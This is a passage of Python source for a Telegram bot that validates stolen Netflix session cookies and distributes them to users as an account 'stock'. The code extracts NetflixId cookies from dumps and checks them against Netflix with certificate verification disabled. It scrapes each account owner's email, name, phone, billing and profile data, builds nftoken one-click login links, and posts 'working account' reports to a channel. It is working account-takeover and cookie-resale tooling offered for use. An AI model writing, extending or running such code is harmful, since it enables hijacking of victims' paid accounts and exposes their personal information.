    except Exception:
        pass
        
    # 2. Netscape cookie file format tab-separated
    if not pairs:
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split('\t')
            if len(parts) >= 7:
                cookie_name = parts[5].strip()
                cookie_val = parts[6].strip()
                if cookie_name == "NetflixId" and cookie_val and cookie_val not in seen:
                    seen.add(cookie_val)
                    pairs.append((cookie_val, None))

    # 3. Fallback regex extraction
    if not pairs:
        netflix_pattern = re.compile(r'(?<!Secure)NetflixId[=:\t\s]+([^\s;\r\n"\']+)', re.IGNORECASE)
        secure_pattern = re.compile(r'SecureNetflixId[=:\t\s]+([^\s;\r\n"\']+)', re.IGNORECASE)
        netflix_matches = netflix_pattern.findall(content)
        secure_matches = secure_pattern.findall(content)
        for i, nid in enumerate(netflix_matches):
            nid = nid.strip('"\'')
            sid = secure_matches[i].strip('"\'') if i < len(secure_matches) else None
            if nid and nid not in seen:
                seen.add(nid)
                pairs.append((nid, sid))
                
    return pairs

def get_cookie_text(netflix_id: str, secure_id: Optional[str] = None) -> str:
    lines = [".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t" + safe_str(netflix_id)]
    if secure_id:
        lines.append(".netflix.com\tTRUE\t/\tTRUE\t0\tSecureNetflixId\t" + safe_str(secure_id))
    return "\n".join(lines)

def check_account(cookies_dict: Dict) -> Dict:
    if not cookies_dict or "NetflixId" not in cookies_dict:
        return {"valid": False, "error": "Missing NetflixId"}
    try:
        session = requests.Session()
        for name, value in cookies_dict.items():
            session.cookies.set(name, value, domain=".netflix.com")
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "identity",
        }
        for attempt in range(MAX_RETRIES):
            try:
                response = session.get(
                    "https://www.netflix.com/account/membership",
                    headers=headers,
                    timeout=CHECK_TIMEOUT,
                    verify=False,
                    allow_redirects=True
                )
                if response.status_code != 200:
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(0.5)
                        continue
                    return {"valid": False, "error": f"HTTP {response.status_code}"}
                
                if "login" in response.url.lower() or "signin" in response.url.lower():
                    return {"valid": False, "error": "Redirected to login"}
                    
                text = response.text
                
                # Check Household Lock or Extra Member screens
                if any(x in text.lower() for x in ["update-primary-location", "household", "not part of the netflix household"]):
                    membership_status = "Household Locked"
                else:
                    membership_status = "Active"

                match = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
                if match and membership_status != "Household Locked":
                    membership_status = match.group(1).strip()
                    
                email = None
                for pattern in [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        email = match.group(1).strip()
                        break
                if not email:
                    match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
                    if match:
                        email = match.group(1).strip()
                        
                name = None
                for pattern in [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        name = match.group(1).strip()
                        break
                        
                country = None
                for pattern in [r'"countryOfSignup"\s*:\s*"([^"]+)"', r'"currentCountry"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        country = match.group(1).strip()
                        break
                        
                plan = None
                for pattern in [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        plan = match.group(1).strip()
                        break
                        
                plan_key = "FREE"
                plan_label = "Free"
                if plan:
                    plan_lower = plan.lower()
                    if any(x in plan_lower for x in ["premium", "高級", "高级"]):
                        plan_key, plan_label = "PREMIUM", "Premium"
                    elif any(x in plan_lower for x in ["standard", "标准", "標準"]):
                        plan_key, plan_label = "STANDARD", "Standard"
                    elif any(x in plan_lower for x in ["basic", "basico", "基本"]):
                        plan_key, plan_label = "BASIC", "Basic"
                    elif any(x in plan_lower for x in ["mobile", "ponsel", "movil"]):
                        plan_key, plan_label = "MOBILE", "Mobile"
                        
                streams = 1
                match = re.search(r'"maxStreams"\s*:\s*([0-9]+)', text)
                if match:
                    streams = int(match.group(1))
                elif plan_key == "PREMIUM":
                    streams = 4
                elif plan_key == "STANDARD":
                    streams = 2
                    
                quality = "HD"
                if plan_key == "PREMIUM":
                    quality = "Ultra HD 4K"
                elif plan_key == "STANDARD":
                    quality = "Full HD"
                    
                price = None
                for pattern in [r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        price = match.group(1).strip()
                        break
                        
                billing = None
                match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
                if match:
                    billing = match.group(1).strip()
                    
                phone = None
                match = re.search(r'"phoneNumberDigits"[^}]*"value"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
                if match:
                    phone = match.group(1).strip()
                    
                profiles = []
                for match in re.finditer(r'"profiles"[^}]*"name"\s*:\s*"([^"]+)"', text, re.IGNORECASE):
                    if match.group(1) not in profiles:
                        profiles.append(match.group(1))
                profiles_str = ", ".join(profiles) if profiles else None
                
                user_guid = None
                for pattern in [r'"userGuid"\s*:\s*"([^"]+)"', r'"ownerGuid"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        user_guid = match.group(1).strip()
                        break
                        
                is_subscribed = plan_key != "FREE" or (membership_status and "current_member" in membership_status.lower())
                
                nftoken = None
                nftoken_expiry = None
                if cookies_dict.get("NetflixId"):
                    nftoken, nftoken_expiry = generate_nftoken(cookies_dict.get("NetflixId"))
                    
                log_daily_stats(hits=1 if is_subscribed else 0, free=1 if not is_subscribed else 0, bad=0)
                
                return {
                    "valid": True,
                    "subscribed": is_subscribed,
                    "email": email,
                    "name": name,
                    "country": country,
                    "plan": plan or plan_label,
                    "plan_key": plan_key,
                    "plan_label": plan_label,
                    "streams": streams,
                    "quality": quality,
                    "price": price,
                    "billing_date": billing,
                    "membership_status": membership_status,
                    "phone": phone,
                    "profiles": profiles_str,
                    "user_guid": user_guid,
                    "nftoken": nftoken,
                    "nftoken_expiry": nftoken_expiry,
                }
            except Exception as e:
                logger.debug(f"Check account attempt {attempt+1} exception: {e}")
                if attempt < MAX_RETRIES - 1:
                    continue
                log_daily_stats(hits=0, free=0, bad=1)
                return {"valid": False, "error": "Error during check"}
        return {"valid": False, "error": "Max retries exceeded"}
    except Exception as e:
        logger.error(f"Error in check_account: {e}")
        return {"valid": False, "error": "Exception"}

# ============================================================
# SEND TO CHANNEL FUNCTIONS - PREMIUM UI
# ============================================================

async def send_working_to_channel(bot, report_id: int, user_id: int, account_id: int, screenshot_file_id: str):
    if not REPORT_CHANNEL_ID:
        return None
    
    try:
        user = get_user(user_id)
        account = get_assigned_account(user_id)
        if not account:
            cur = db.execute('SELECT * FROM accounts WHERE id = ?', (account_id,))
            row = cur.fetchone()
            if row:
                account = {
                    "id": row[0], "email": safe_str(row[1]), "country": safe_str(row[2]), 
                    "plan": safe_str(row[3]), "account_name": safe_str(row[15]), 
                    "streams": safe_int(row[16]), "quality": safe_str(row[17]),
                    "price": safe_str(row[18]), "billing_date": safe_str(row[19]),
                    "extra_member": safe_bool(row[24]), "profiles": safe_str(row[28]),
                    "user_guid": safe_str(row[29]), "nftoken": safe_str(row[5]), 
                    "nftoken_expiry": safe_str(row[6]), "phone": safe_str(row[23]),
                    "membership_status": safe_str(row[25])
                }
        if not account:
            return None
        
        token = safe_str(account.get('nftoken'))
        nft_expiry = safe_str(account.get('nftoken_expiry'))
        
        text = f"""📱 <b>WORKING ACCOUNT FOUND!</b>

━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>{h(account.get('email'))}</code>
👤 <b>Name:</b> {h(account.get('account_name'))}
📱 <b>Phone:</b> {h(account.get('phone', 'Not provided'))}
🌍 <b>Country:</b> {h(account.get('country'))}
📦 <b>Plan:</b> {h(account.get('plan'))}
🛡️ <b>Status:</b> {h(account.get('membership_status', 'Active'))}
📺 <b>Streams:</b> {safe_int(account.get('streams'))}
🎞️ <b>Quality:</b> {h(account.get('quality', 'HD'))}
💰 <b>Price:</b> {h(account.get('price', 'N/A'))}
🗓️ <b>Billing:</b> {h(account.get('billing_date'))}
👥 <b>Extra Member:</b> {'✅ Yes' if safe_bool(account.get('extra_member')) else '❌ No'}
🎭 <b>Profiles:</b> {h(account.get('profiles', 'None'))}
🆔 <b>GUID:</b> <code>{h(account.get('user_guid'))}</code>
━━━━━━━━━━━━━━━━━━━━━
"""
        if token and len(token) > 10:
            text += f"⏳ <b>NFToken expires:</b> <code>{h(nft_expiry)}</code>\n"
        
        text += f"""
━━━━━━━━━━━━━━━━━━━━━
✅ <b>Reported by:</b> @{h(user.get('username'))}
🕐 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
━━━━━━━━━━━━━━━━━━━━━
👨‍💻 <b>Developer:</b> @Senzo268

⚠️ <b>This account is working!</b>
"""
        
        keyboard = []
        if token and len(token) > 10:
            keyboard.append([
                InlineKeyboardButton("📱 Phone Login", url=f"https://netflix.com/unsupported?nftoken={token}"),
                InlineKeyboardButton("🖥️ PC Login", url=f"https://netflix.com/login?nftoken={token}")
            ])
            keyboard.append([
                InlineKeyboardButton("📺 TV Login", url=f"https://netflix.com/tv8?nftoken={token}")
            ])
        else:
            keyboard.append([
                InlineKeyboardButton("📱 Phone Login", url="https://netflix.com/unsupported"),
                InlineKeyboardButton("🖥️ PC Login", url="https://netflix.com/login")
            ])
            keyboard.append([
                InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
            ])
            
        keyboard.append([
            InlineKeyboardButton("✅ Confirm Working", callback_data=f"confirm_working_{report_id}_{account_id}")
        ])
        
        try:
            sent_message = await bot.send_photo(
                chat_id=REPORT_CHANNEL_ID,
                photo=screenshot_file_id,
                caption=text,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode=ParseMode.HTML
            )
            update_report_channel_post(report_id, sent_message.message_id)
            return sent_message.message_id
        except Exception as e:
            logger.error(f"Failed to send photo to channel: {e}")
            try:
                sent_message = await bot.send_message(
                    chat_id=REPORT_CHANNEL_ID,
                    text=text,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode=ParseMode.HTML
                )
                update_report_channel_post(report_id, sent_message.message_id)
                return sent_message.message_id
            except Exception as ex:
                logger.error(f"Failed to send text to channel: {ex}")
                return None
    except Exception as e:
        logger.error(f"Error in send_working_to_channel: {e}")
        return None

async def send_notworking_to_channel(bot, report_id: int, user_id: int, account_id: int, screenshot_file_id: str):
    if not REPORT_CHANNEL_ID:
        return None
    
    try:
        user = get_user(user_id)
        account = get_assigned_account(user_id)
        if not account:
            cur = db.execute('SELECT * FROM accounts WHERE id = ?', (account_id,))
            row = cur.fetchone()
            if row:
                account = {
                    "id": row[0], "email": safe_str(row[1]), "country": safe_str(row[2]), 
                    "plan": safe_str(row[3]), "account_name": safe_str(row[15]), 
                    "streams": safe_int(row[16]), "quality": safe_str(row[17]),
                    "price": safe_str(row[18]), "billing_date": safe_str(row[19]),
                    "extra_member": safe_bool(row[24]), "profiles": safe_str(row[28]),
                    "user_guid": safe_str(row[29]), "nftoken": safe_str(row[5]), 
                    "nftoken_expiry": safe_str(row[6]), "phone": safe_str(row[23]),
                    "membership_status": safe_str(row[25])
                }
        if not account:
            return None
        
        token = safe_str(account.get('nftoken'))
        nft_expiry = safe_str(account.get('nftoken_expiry'))
        
        text = f"""❌ <b>NOT WORKING ACCOUNT REPORTED!</b>

━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>{h(account.get('email'))}</code>
👤 <b>Name:</b> {h(account.get('account_name'))}
📱 <b>Phone:</b> {h(account.get('phone', 'Not provided'))}
🌍 <b>Country:</b> {h(account.get('country'))}
📦 <b>Plan:</b> {h(account.get('plan'))}
━━━━━━━━━━━━━━━━━━━━━

🔑 <b>ADMIN: Test this account before deciding</b>
"""
        if token and len(token) > 10:
            text += f"\n⏳ <b>NFToken expires:</b> <code>{h(nft_expiry)}</code>\n"

        text += f"""
━━━━━━━━━━━━━━━━━━━━━
⚠️ <b>Reported by:</b> @{h(user.get('username'))}
🕐 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
━━━━━━━━━━━━━━━━━━━━━
👨‍💻 <b>Developer:</b> @Senzo268

⛔ <b>This account is reported as NOT working!</b>
⚠️ <b>Dismiss = Account will be REMOVED from stock</b>
"""
        
        keyboard = []
        if token and len(token) > 10:
            keyboard.append([
                InlineKeyboardButton("📱 Phone Login", url=f"https://netflix.com/unsupported?nftoken={token}"),
                InlineKeyboardButton("🖥️ PC Login", url=f"https://netflix.com/login?nftoken={token}")
            ])
            keyboard.append([
                InlineKeyboardButton("📺 TV Login", url=f"https://netflix.com/tv8?nftoken={token}")
            ])
        else:
            keyboard.append([
                InlineKeyboardButton("📱 Phone Login", url="https://netflix.com/unsupported"),
                InlineKeyboardButton("🖥️ PC Login", url="https://netflix.com/login")
            ])
            keyboard.append([
                InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
            ])
            
        keyboard.append([
            InlineKeyboardButton("✅ Yes, Ban User", callback_data=f"ban_user_{report_id}_{account_id}_{user_id}"),
            InlineKeyboardButton("⚠️ Warn User", callback_data=f"warn_user_{report_id}_{account_id}_{user_id}"),
            InlineKeyboardButton("❌ Dismiss", callback_data=f"dismiss_report_{report_id}_{account_id}")
        ])
        
        try:
            sent_message = await bot.send_photo(
                chat_id=REPORT_CHANNEL_ID,
                photo=screenshot_file_id,
                caption=text,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode=ParseMode.HTML
            )
            update_report_channel_post(report_id, sent_message.message_id)
            return sent_message.message_id
        except Exception as e:
            logger.error(f"Failed to send not working photo: {e}")
            try:
                sent_message = await bot.send_message(
                    chat_id=REPORT_CHANNEL_ID,
                    text=text,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode=ParseMode.HTML
                )
                update_report_channel_post(report_id, sent_message.message_id)
                return sent_message.message_id
            except Exception as ex:
                logger.error(f"Failed to send not working text: {ex}")
                return None
    except Exception as e:
        logger.error(f"Error in send_notworking_to_channel: {e}")
        return None

# ============================================================
# CHANNEL CALLBACK HANDLERS
# ============================================================

async def confirm_working_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        data = query.data
        parts = data.split("_")
        if len(parts) < 4:
            return
        report_id = int(parts[2])
        account_id = int(parts[3])
        admin_id = query.from_user.id
        
        if admin_id not in ADMIN_IDS:
            await query.answer("⛔ Not authorized!", show_alert=True)
            return
        
        confirm_account_working(account_id, report_id, admin_id)
        current_caption = query.message.caption or query.message.text or ""
        await query.edit_message_caption(
            caption=current_caption + "\n\n✅ <b>CONFIRMED WORKING by Admin!</b>",
            parse_mode=ParseMode.HTML
        )
        await query.answer("✅ Account confirmed working!")
        
        cur = db.execute('SELECT user_id FROM reports WHERE id = ?', (report_id,))
        row = cur.fetchone()
        if row:
            try:
                await context.bot.send_message(
                    row[0],
                    f"✅ <b>Your report #{report_id} has been CONFIRMED!</b>\n\n"
                    f"🎉 Account is working. Thank you for your feedback!\n\n"
                    f"👨‍💻 <b>Developer:</b> @Senzo268",
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
    except Exception as e:
        logger.error(f"Error in confirm_working_callback: {e}")

async def ban_user_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        data = query.data
        parts = data.split("_")
        if len(parts) < 5:
            return
        report_id = int(parts[2])
        account_id = int(parts[3])
        user_id = int(parts[4])
        admin_id = query.from_user.id
        
        if admin_id not in ADMIN_IDS:
            await query.answer("⛔ Not authorized!", show_alert=True)
            return
        
        ban_user_from_bot(user_id, admin_id, "False report (Not Working)")
        delete_account(account_id)
        db.execute('UPDATE reports SET status = "accepted", reviewed_at = CURRENT_TIMESTAMP, admin_id = ? WHERE id = ?', (admin_id, report_id))
        db.commit()
        
        current_caption = query.message.caption or query.message.text or ""
        await query.edit_message_caption(
            caption=current_caption + "\n\n✅ <b>USER BANNED & ACCOUNT REMOVED!</b>",
            parse_mode=ParseMode.HTML
        )
        await query.answer("✅ User banned and account removed!")
        
        try:
            await context.bot.send_message(
                user_id,
                f"🚫 <b>You have been BANNED from this bot!</b>\n\n"
                f"Reason: False report (Not Working)\n"
                f"Report ID: #{report_id}\n\n"
                f"👨‍💻 <b>Developer:</b> @Senzo268",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass
    except Exception as e:
        logger.error(f"Error in ban_user_callback: {e}")

async def warn_user_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        data = query.data
        parts = data.split("_")
        if len(parts) < 5:
            return
        report_id = int(parts[2])
        account_id = int(parts[3])
        user_id = int(parts[4])
        admin_id = query.from_user.id
        
        if admin_id not in ADMIN_IDS:
            await query.answer("⛔ Not authorized!", show_alert=True)
            return
        
        warnings = add_warning(user_id, admin_id, "False report (Not Working)")
        delete_account(account_id)
        db.execute('UPDATE reports SET status = "accepted", reviewed_at = CURRENT_TIMESTAMP, admin_id = ? WHERE id = ?', (admin_id, report_id))
        db.commit()
        
        current_caption = query.message.caption or query.message.text or ""
        if warnings >= 3:
            ban_user_from_bot(user_id, admin_id, "3 warnings - Auto ban")
            await query.edit_message_caption(
                caption=current_caption + f"\n\n⚠️ <b>USER WARNED ({warnings}/3) - NOW BANNED!</b>",
                parse_mode=ParseMode.HTML
            )
            await query.answer("⚠️ User warned and banned (3 warnings)!")
            try:
                await context.bot.send_message(
                    user_id,
                    f"🚫 <b>You have been BANNED from this bot!</b>\n\n"
                    f"Reason: 3 warnings for false reports\n"
                    f"Report ID: #{report_id}\n\n"
                    f"👨‍💻 <b>Developer:</b> @Senzo268",
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
        else:
            await query.edit_message_caption(
                caption=current_caption + f"\n\n⚠️ <b>USER WARNED ({warnings}/3) - ACCOUNT REMOVED!</b>",
                parse_mode=ParseMode.HTML
            )
            await query.answer(f"⚠️ User warned ({warnings}/3)!")
            try:
                await context.bot.send_message(
                    user_id,
                    f"⚠️ <b>Warning #{warnings}/3</b>\n\n"
                    f"Reason: False report (Not Working)\n"
                    f"Report ID: #{report_id}\n"
                    f"⚠️ {3 - warnings} warning(s) remaining before ban.\n\n"
                    f"👨‍💻 <b>Developer:</b> @Senzo268",
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
    except Exception as e:
        logger.error(f"Error in warn_user_callback: {e}")

async def dismiss_report_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        data = query.data
        parts = data.split("_")
        if len(parts) < 4:
            return
        report_id = int(parts[2])
        account_id = int(parts[3])
        admin_id = query.from_user.id
        
        if admin_id not in ADMIN_IDS:
            await query.answer("⛔ Not authorized!", show_alert=True)
            return
        
        delete_account(account_id)
        db.execute('UPDATE reports SET status = "rejected", reviewed_at = CURRENT_TIMESTAMP, admin_id = ? WHERE id = ?', (admin_id, report_id))
        db.commit()
        
        current_caption = query.message.caption or query.message.text or ""
        await query.edit_message_caption(
            caption=current_caption + "\n\n✅ <b>DISMISSED - Account Removed from Stock!</b>",
            parse_mode=ParseMode.HTML
        )
        await query.answer("✅ Account removed from stock!")
        
        cur = db.execute('SELECT user_id FROM reports WHERE id = ?', (report_id,))
        row = cur.fetchone()
        if row:
            try:
                await context.bot.send_message(
                    row[0],
                    f"✅ <b>Your report #{report_id} has been ACCEPTED!</b>\n\n"
                    f"🔄 Account has been removed from stock.\n\n"
                    f"👨‍💻 <b>Developer:</b> @Senzo268",
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
    except Exception as e:
        logger.error(f"Error in dismiss_report_callback: {e}")

# ============================================================
# FORCE SUB CHECK HELPER
# ============================================================

async def check_force_sub(bot, user_id: int) -> Tuple[bool, List[InlineKeyboardButton]]:
    try:
        cur = db.execute('SELECT channel_id, channel_name, invite_link FROM channels WHERE is_active = 1')
        channels = cur.fetchall()
        if not channels:
            return True, []
            
        missing_buttons = []
        for ch in channels:
            ch_id, ch_name, ch_link = ch[0], ch[1], ch[2]
            try:
                member = await bot.get_chat_member(chat_id=ch_id, user_id=user_id)
                if member.status not in [ChatMember.MEMBER, ChatMember.ADMINISTRATOR, ChatMember.OWNER]:
                    missing_buttons.append(InlineKeyboardButton(f"📢 Join {ch_name}", url=ch_link))
            except Exception:
                pass
                
        if missing_buttons:
            return False, missing_buttons
        return True, []
    except Exception:
        return True, []

# ============================================================
# TELEGRAM BOT USER HANDLERS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        user_id = user.id
        create_user(user_id, safe_str(user.username), safe_str(user.first_name))
        user_data = get_user(user_id)
        
        if safe_bool(user_data.get("is_banned")):
            await send_or_edit(update, "🚫 You are banned from using this bot.")
            return
            
        subbed, ch_buttons = await check_force_sub(context.bot, user_id)
        if not subbed:
            keyboard = [[btn] for btn in ch_buttons]
            keyboard.append([InlineKeyboardButton("✅ I Have Joined", callback_data="back_menu")])
            await send_or_edit(
                update,
                "⚠️ <b>Must Join Channel(s)</b>\n\nPlease join our required channels to use this bot!",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return

        if safe_bool(user_data.get("pending_report")):
            await send_or_edit(
                update,
                "⚠️ <b>You have a pending report!</b>\n\nPlease upload a screenshot proof of the account status.\n\n👨‍💻 <b>Developer:</b> @Senzo268"
            )
            return
        
        stats = get_total_accounts()
        plan_display = ""
        for plan, count in stats.get('plans', {}).items():
            emoji = {"PREMIUM": "👑", "STANDARD": "⭐", "BASIC": "🎯", "MOBILE": "📱", "FREE": "🆓"}.get(plan.upper(), "📦")
            plan_display += f"│ {emoji} {h(plan)}: <b>{count}</b>\n"
        if not plan_display:
            plan_display = "│ No accounts available\n"
        
        assigned = get_assigned_account(user_id)
        
        keyboard = [
            [InlineKeyboardButton("🎯 Get Account", callback_data="get_account")],
        ]
        
        if assigned:
            keyboard.append([
                InlineKeyboardButton("✅ Working", callback_data="working"),
                InlineKeyboardButton("❌ Not Working", callback_data="notworking"),
            ])
        
        keyboard.append([
            InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
            InlineKeyboardButton("📊 My Status", callback_data="my_status"),
        ])
        
        if safe_bool(user_data.get("is_admin")) or user_id in ADMIN_IDS:
            keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
        
        text = f"""🌟 <b>WELCOME TO SENZO NETFLIX BOT</b> 🌟
━━━━━━━━━━━━━━━━━━━━━
👋 Hello <b>{h(user.first_name)}</b>!
━━━━━━━━━━━━━━━━━━━━━
📊 <b>ACCOUNT STOCK</b>
┌─────────────────────
│ 📦 Total Available: <b>{safe_int(stats.get('total'))}</b>
{plan_display}└─────────────────────
⚙️ <b>YOUR STATS</b>
┌─────────────────────
│ ✅ Working Reports: <b>{safe_int(user_data.get('working_reports'))}</b>
│ ❌ Not Working: <b>{safe_int(user_data.get('notworking_reports'))}</b>
│ 📦 Accounts Used: <b>{safe_int(user_data.get('accounts_used'))}/{MAX_ACCOUNTS_PER_USER}</b>
│ ⚠️ Warnings: <b>{safe_int(user_data.get('warnings'))}/3</b>
└─────────────────────
⏳ Cooldown: <b>{WORKING_COOLDOWN_MINUTES} min</b>
━━━━━━━━━━━━━━━━━━━━━
🔽 <b>SELECT AN OPTION BELOW</b>
👨‍💻 <b>Developer:</b> @Senzo268
"""
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in start command: {e}")

async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        user_data = get_user(user_id)
        
        if safe_bool(user_data.get("is_banned")):
            await send_or_edit(update, "🚫 You are banned from using this bot.")
            return
            
        subbed, ch_buttons = await check_force_sub(context.bot, user_id)
        if not subbed:
            keyboard = [[btn] for btn in ch_buttons]
            keyboard.append([InlineKeyboardButton("✅ I Have Joined", callback_data="back_menu")])
            await send_or_edit(
                update,
                "⚠️ <b>Must Join Channel(s)</b>\n\nPlease join our required channels to use this bot!",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return

        can_get, msg = can_get_account(user_id)
        if not can_get:
            keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]]
            await send_or_edit(update, f"⚠️ {msg}", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        
        account = assign_account(user_id)
        if not account:
            keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]]
            await send_or_edit(update, "❌ No available accounts in stock right now. Please check back later!", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        
        cookie_full = safe_str(account.get('cookies', 'No cookies available'))
        if len(cookie_full) > 3500:
            cookie_display = cookie_full[:3500] + "\n... (cookie truncated)"
        else:
            cookie_display = cookie_full
        
        token = safe_str(account.get('nftoken'))
        nft_expiry = safe_str(account.get('nftoken_expiry'))
        
        text = f"""🎉 <b>ACCOUNT ASSIGNED!</b>
━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>{h(account.get('email'))}</code>
👤 <b>Name:</b> {h(account.get('account_name'))}
📱 <b>Phone:</b> {h(account.get('phone', 'Not provided'))}
🌍 <b>Country:</b> {h(account.get('country'))}
📦 <b>Plan:</b> {h(account.get('plan'))}
🛡️ <b>Status:</b> {h(account.get('membership_status', 'Active'))}
📺 <b>Streams:</b> {safe_int(account.get('streams'))}
🎞️ <b>Quality:</b> {h(account.get('quality', 'HD'))}
💰 <b>Price:</b> {h(account.get('price', 'N/A'))}
🗓️ <b>Billing:</b> {h(account.get('billing_date'))}
👥 <b>Extra Member:</b> {'✅ Yes' if safe_bool(account.get('extra_member')) else '❌ No'}
🎭 <b>Profiles:</b> {h(account.get('profiles', 'None'))}
🆔 <b>GUID:</b> <code>{h(account.get('user_guid'))}</code>
━━━━━━━━━━━━━━━━━━━━━
🍪 <b>Cookie:</b>
<code>{h(cookie_display)}</code>
━━━━━━━━━━━━━━━━━━━━━
"""
        if token and len(token) > 10:
            text += f"⏳ <b>NFToken expires:</b> <code>{h(nft_expiry)}</code>\n\n"

        text += """📝 <b>INSTRUCTIONS:</b>
1️⃣ Click a login link below or use Cookie Editor
2️⃣ Test the account working status
3️⃣ Report Working or Not Working below

👨‍💻 <b>Developer:</b> @Senzo268
"""
        keyboard = []
        if token and len(token) > 10:
            keyboard.append([
                InlineKeyboardButton("📱 Phone Login", url=f"https://netflix.com/unsupported?nftoken={token}"),
                InlineKeyboardButton("🖥️ PC Login", url=f"https://netflix.com/login?nftoken={token}")
            ])
            keyboard.append([
                InlineKeyboardButton("📺 TV Login", url=f"https://netflix.com/tv8?nftoken={token}")
            ])
        else:
            keyboard.append([
                InlineKeyboardButton("📱 Phone Login", url="https://netflix.com/unsupported"),
                InlineKeyboardButton("🖥️ PC Login", url="https://netflix.com/login")
            ])
            keyboard.append([
                InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
            ])
        
        keyboard.append([
            InlineKeyboardButton("✅ Working", callback_data=f"report_working_{account['id']}"),
            InlineKeyboardButton("❌ Not Working", callback_data=f"report_notworking_{account['id']}")
        ])
        keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")])
        
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in get_account callback: {e}")

async def working_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        user_data = get_user(user_id)
        
        if safe_bool(user_data.get("is_banned")):
            await send_or_edit(update, "🚫 You are banned from using this bot.")
            return
        
        if safe_bool(user_data.get("pending_report")):
            await send_or_edit(update, "⚠️ You already have a pending report! Please upload a screenshot first.")
            return
        
        account_id = None
        data = update.callback_query.data if update.callback_query else ""
        if data.startswith("report_working_"):
            account_id = int(data.split("_")[2])
        else:
            assigned = get_assigned_account(user_id)
            if assigned:
                account_id = assigned["id"]
                
        if not account_id:
            await send_or_edit(update, "⚠️ No active assigned account found. Please click 'Get Account'.")
            return
        
        db.execute('''
            UPDATE users 
            SET pending_report = 1, pending_report_account_id = ?, pending_report_type = 'working'
            WHERE user_id = ?
        ''', (account_id, user_id))
        db.commit()
        
        await send_or_edit(
            update,
            "✅ <b>Report Type: WORKING</b>\n\n"
            "📸 <b>Please upload a screenshot proof now!</b>\n\n"
            "⚠️ Send an image of the logged in account or stream playing.\n\n"
            "👨‍💻 <b>Developer:</b> @Senzo268"
        )
    except Exception as e:
        logger.error(f"Error in working_callback: {e}")

async def notworking_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        user_data = get_user(user_id)
        
        if safe_bool(user_data.get("is_banned")):
            await send_or_edit(update, "🚫 You are banned from using this bot.")
            return
        
        if safe_bool(user_data.get("pending_report")):
            await send_or_edit(update, "⚠️ You already have a pending report! Please upload a screenshot first.")
            return
        
        account_id = None
        data = update.callback_query.data if update.callback_query else ""
        if data.startswith("report_notworking_"):
